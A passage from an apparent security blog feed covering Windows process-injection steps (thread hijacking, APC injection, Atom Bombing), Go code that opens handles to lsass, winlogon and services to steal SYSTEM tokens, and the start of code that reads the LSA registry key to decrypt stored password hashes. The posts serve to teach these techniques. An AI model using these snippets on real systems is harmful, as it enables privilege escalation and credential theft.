&lt;li&gt;call &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread&#34;&gt;&lt;code&gt;OpenThread&lt;/code&gt;&lt;/a&gt; and specify the thread ID to open&lt;/li&gt;
&lt;li&gt;call &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread&#34;&gt;&lt;code&gt;SuspendThread&lt;/code&gt;&lt;/a&gt; or &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/wow64apiset/nf-wow64apiset-wow64suspendthread&#34;&gt;&lt;code&gt;Wow64SuspendThread&lt;/code&gt;&lt;/a&gt; to suspend the thread.&lt;/li&gt;
&lt;li&gt;use &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&#34;&gt;&lt;code&gt;VirtualAlloc&lt;/code&gt;&lt;/a&gt; to allocate memory&lt;/li&gt;
&lt;li&gt;Write the new memory with &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&#34;&gt;&lt;code&gt;WriteProcessMemory&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;call &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext&#34;&gt;&lt;code&gt;SetThreadContext&lt;/code&gt;&lt;/a&gt; and &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread&#34;&gt;&lt;code&gt;ResumeThread&lt;/code&gt;&lt;/a&gt; to set control flow and resume the thread to run the new code.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;apc-injectionasynchronous-procedure-call&#34;&gt;APC Injection/Asynchronous procedure call&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;//localhost:1313/malware101/apc_injection.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Allows for tasks to be queued and executed in the context of a thread.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Write code to the target process normally&lt;/li&gt;
&lt;li&gt;Open a thread with &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread&#34;&gt;&lt;code&gt;OpenThread&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Then Queue a new APC task with &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc&#34;&gt;&lt;code&gt;QueueUserAPC&lt;/code&gt;&lt;/a&gt; or &lt;a href=&#34;https://ntdoc.m417z.com/ntqueueapcthread&#34;&gt;&lt;code&gt;NtQueueApcThread&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Resume the process normally to then execute the new APC thread.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;atom-bombing&#34;&gt;Atom Bombing&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;//localhost:1313/malware101/atom.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Shares similarities to APC injection but involves &amp;ldquo;Atoms&amp;rdquo; (functions and definitions related are in the #Terms 101 section)&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Create a new global Atom with &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globaladdatoma&#34;&gt;&lt;code&gt;GlobalAddAtom&lt;/code&gt;&lt;/a&gt;(there are other functions than this one)&lt;/li&gt;
&lt;li&gt;Start the APC queue with &lt;a href=&#34;https://ntdoc.m417z.com/ntqueueapcthread&#34;&gt;&lt;code&gt;NtQueueApcThread&lt;/code&gt;&lt;/a&gt; to force the process to do step 3.&lt;/li&gt;
&lt;li&gt;get the Atom with &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globalgetatomnamea&#34;&gt;&lt;code&gt;GlobalGetAtomName&lt;/code&gt;&lt;/a&gt;(there are other functions than this one)&lt;/li&gt;
&lt;li&gt;Process now is storing the shellcode or malicious code.&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;process-image-manipulation&#34;&gt;Process image manipulation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;tampering process images and windows handles for processes&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;terms-101&#34;&gt;Terms 101&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Shellcode: code that executes regardless of where it is in memory (&lt;a href=&#34;https://medium.com/@yua.mikanana19/position-independent-code-pic-and-shellcode-an-introduction-1ea71f707ad&#34;&gt;https://medium.com/@yua.mikanana19/position-independent-code-pic-and-shellcode-an-introduction-1ea71f707ad&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Malware analysis: analyze malware behavior and signatures to identify the threat actor(s).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;EDR(endpoint detection and response): A stack of software for protecting endpoints like domain controllers or critical infrastructure.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;XDR(extended detection and response): A stack of software like an EDR but offers more detection, data sources, and security tools.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DKOM: Direct kernel object modification&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DCOM: Distributed component object model extends COM objects for remote procedure calls and references&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;COM: component object model is for allowing applications to share and distribute data regardless of programming language&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Atoms: specific pieces of data like strings, stored in a structure called an &amp;ldquo;Atom Table&amp;rdquo;, used in communication between processes to coordinate actions.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Atom Table: A table of Atoms that can be global (&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globaladdatoma&#34;&gt;&lt;code&gt;GlobalAddAtom&lt;/code&gt;&lt;/a&gt;, there are other functions than this one) or local (&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-addatoma&#34;&gt;&lt;code&gt;AddAtom&lt;/code&gt;&lt;/a&gt;, there are other functions than this one).&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Windows-Tokens</title>
      <link>//localhost:1313/posts/windowstokens/</link>
      <pubDate>Thu, 20 Mar 2025 14:17:56 -0700</pubDate>
      
      <guid>//localhost:1313/posts/windowstokens/</guid>
      <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
&lt;p&gt;In windows things like access permissions are handled with tokens. Think of them as API tokens, they have certain permissions that you can do like impersonate other users or enable debugging on windows. The things that will be looked at in this post is how you can use windows tokens to get lower permissions than the Administrator user.&lt;/p&gt;
&lt;h2 id=&#34;stealing-tokens-via-windows-processes&#34;&gt;Stealing Tokens Via Windows Processes&lt;/h2&gt;
&lt;p&gt;Getting right to the point. In windows processes also have access tokens and certain processes like winlogon you can duplicate the token and use it to run commands as another user. This is done by first opening the process to get the token like so:&lt;/p&gt;</description>
      <content>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
&lt;p&gt;In windows things like access permissions are handled with tokens. Think of them as API tokens, they have certain permissions that you can do like impersonate other users or enable debugging on windows. The things that will be looked at in this post is how you can use windows tokens to get lower permissions than the Administrator user.&lt;/p&gt;
&lt;h2 id=&#34;stealing-tokens-via-windows-processes&#34;&gt;Stealing Tokens Via Windows Processes&lt;/h2&gt;
&lt;p&gt;Getting right to the point. In windows processes also have access tokens and certain processes like winlogon you can duplicate the token and use it to run commands as another user. This is done by first opening the process to get the token like so:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;findSystemProcess&lt;/span&gt;() (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Handle&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;h&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CreateToolhelp32Snapshot&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TH32CS_SNAPPROCESS&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// take snapshots of processes.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CreateToolhelp32Snapshot failed: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CloseHandle&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;h&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// close it when the function closes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pe&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProcessEntry32&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// create the process entry struct.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;pe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Size&lt;/span&gt; = uint32(&lt;span style=&#34;color:#a6e22e&#34;&gt;unsafe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sizeof&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pe&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Process32First&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;h&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pe&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Process32First failed: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;systemProcesses&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lsass.exe&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;winlogon.exe&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;services.exe&amp;#34;&lt;/span&gt;} &lt;span style=&#34;color:#75715e&#34;&gt;// system processes with low level token access.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;UTF16ToString&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ExeFile&lt;/span&gt;[:])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;procName&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;systemProcesses&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;procName&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#a6e22e&#34;&gt;handle&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;OpenProcess&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PROCESS_QUERY_INFORMATION&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;pe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProcessID&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// open the process and get the handle&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OpenProcess failed for %s: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;procName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;handle&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// return no error, break out of the loop and return the handle&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Process32Next&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;h&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pe&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// next process&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ERROR_NO_MORE_FILES&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Process32Next failed: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No suitable system process found&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the &amp;ldquo;systemProcesses&amp;rdquo; array there are windows process that are ran by the system user which is a user that has even more access than the Administrator user. The only user that has even more privileges than the system user is the &amp;ldquo;TrustedInstaller&amp;rdquo; user which can delete everything in windows.&lt;/p&gt;
&lt;h2 id=&#34;token-attacks&#34;&gt;Token Attacks&lt;/h2&gt;
&lt;p&gt;There&amp;rsquo;s 5 different ways to attack windows access tokens.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Token Impersonation:
&lt;ul&gt;
&lt;li&gt;Token Duplication using &amp;ldquo;DuplicateTokenEx&amp;rdquo; (used in go-go-gadget-katz)&lt;/li&gt;
&lt;li&gt;Tokens obtained by this method are used with ImpersonateLoggedOnUser to impersonate users&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Create Process With token
&lt;ul&gt;
&lt;li&gt;Creating a new process using an existing token&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;to be continued&amp;hellip;.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Win-Registry-Secrets</title>
      <link>//localhost:1313/posts/winregistrysecrets/</link>
      <pubDate>Thu, 20 Mar 2025 13:50:08 -0700</pubDate>
      
      <guid>//localhost:1313/posts/winregistrysecrets/</guid>
      <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
&lt;p&gt;The windows registry is a system database that contains keys and values. Some things in the registry include; Windows credentials, cached passwords, usernames, and other credentials. In windows a group of keys is called a &amp;ldquo;hive&amp;rdquo; the hives that are the cool ones are; SAM, System, and Security.&lt;/p&gt;
&lt;h2 id=&#34;system-hive&#34;&gt;SYSTEM Hive&lt;/h2&gt;
&lt;p&gt;The most important registry hive is the &amp;ldquo;System&amp;rdquo; hive, in the key: &lt;code&gt;CurrentControlSet\Control\Lsa&lt;/code&gt; there are the necessary components to craft the boot key which will be used to decrypt the rest of the registry database to get things like hashes for users. Here&amp;rsquo;s some example code from &amp;ldquo;Go-Go-Gadget-Katz&amp;rdquo; for getting the boot key:&lt;/p&gt;</description>
      <content>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
&lt;p&gt;The windows registry is a system database that contains keys and values. Some things in the registry include; Windows credentials, cached passwords, usernames, and other credentials. In windows a group of keys is called a &amp;ldquo;hive&amp;rdquo; the hives that are the cool ones are; SAM, System, and Security.&lt;/p&gt;
&lt;h2 id=&#34;system-hive&#34;&gt;SYSTEM Hive&lt;/h2&gt;
&lt;p&gt;The most important registry hive is the &amp;ldquo;System&amp;rdquo; hive, in the key: &lt;code&gt;CurrentControlSet\Control\Lsa&lt;/code&gt; there are the necessary components to craft the boot key which will be used to decrypt the rest of the registry database to get things like hashes for users. Here&amp;rsquo;s some example code from &amp;ldquo;Go-Go-Gadget-Katz&amp;rdquo; for getting the boot key:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;registry&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;OpenKey&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;registry&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;LOCAL_MACHINE&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;`SYSTEM\CurrentControlSet\Control\Lsa`&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;registry&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;READ&lt;/span&gt;|&lt;span style=&#34;color:#a6e22e&#34;&gt;registry&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;QUERY_VALUE&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error opening LSA key: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Close&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// Read the values from the registry&lt;/span&gt;
